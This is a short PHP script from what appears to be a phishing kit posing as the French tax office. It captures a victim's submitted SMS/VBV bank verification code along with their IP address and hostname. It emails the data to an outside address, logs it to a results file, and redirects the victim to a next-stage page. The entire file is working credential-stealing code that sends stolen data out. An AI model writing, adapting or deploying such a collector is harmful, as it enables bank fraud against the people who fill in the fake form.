<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[CASH OUT2]\n";
$message .= "SMS/VBV: ".$_POST['o8']."\n";
$send = "igxghri@hi2.in";
$subject = "SMS IMPOTS:  $ip";
$headers = "From:Impo Fresh <result@result.com>";
mail($send,$subject,$message,$headers);

$file = fopen("../Full.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message);


echo '<script language="Javascript">
<!--
document.location.replace("./load1.php");
// -->
</script>';
?>